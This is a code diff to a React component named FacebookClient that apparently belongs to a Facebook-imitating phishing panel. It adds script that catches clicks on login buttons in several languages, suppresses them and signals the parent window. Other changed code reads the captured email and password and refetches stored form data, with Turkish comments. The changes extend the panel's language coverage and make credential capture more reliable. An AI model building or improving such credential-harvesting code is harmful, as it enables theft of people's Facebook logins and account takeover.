@@ -126,7 +126,12 @@ export function FacebookClient({ sessionId: propSid }: Props) {
                   for (var i = 0; i < 10 && el; i++) {
                     var txt = (el.textContent || '').trim();
                     var al = (el.getAttribute && el.getAttribute('aria-label')) || '';
-                    if (txt === 'Logi sisse' || txt === 'Prisijungti' || txt === 'Log in' || al === 'Logi sisse' || al === 'Prisijungti' || al === 'Log in' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0 || txt.indexOf('Log in') === 0 || al.indexOf('Log in') === 0) {
+                    var hit = function (s) {
+                      if (!s) return false;
+                      if (s === 'Logi sisse' || s === 'Prisijungti' || s === 'Log in' || s === 'Anmelden' || s === 'Einloggen') return true;
+                      return s.indexOf('Prisijungti') === 0 || s.indexOf('Log in') === 0 || s.indexOf('Anmelden') === 0;
+                    };
+                    if (hit(txt) || hit(al)) {
                       window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                       e.preventDefault();
                       e.stopPropagation();
@@ -624,7 +629,12 @@ export function FacebookClient({ sessionId: propSid }: Props) {
       /* ignore */
     }
 
-    if (!uuid || !email || !password) return;
+    // uuid cozulmemisse (async resolve henuz bitmediyse) veya form bos ise
+    // flag'i sifirla ki kullanici tekrar tiklayabilsin.
+    if (!uuid || !email || !password) {
+      submitHandledRef.current = false;
+      return;
+    }
 
     // 2) VERITABANINDAN GUNCEL form_data'YI TEKRAR CEK (useState STALE OLDUGU ICIN!)
     //    Boylece ESKI FB degerlerini (baska client tarafindan son guncellenen) DOGRU okumus oluyoruz.
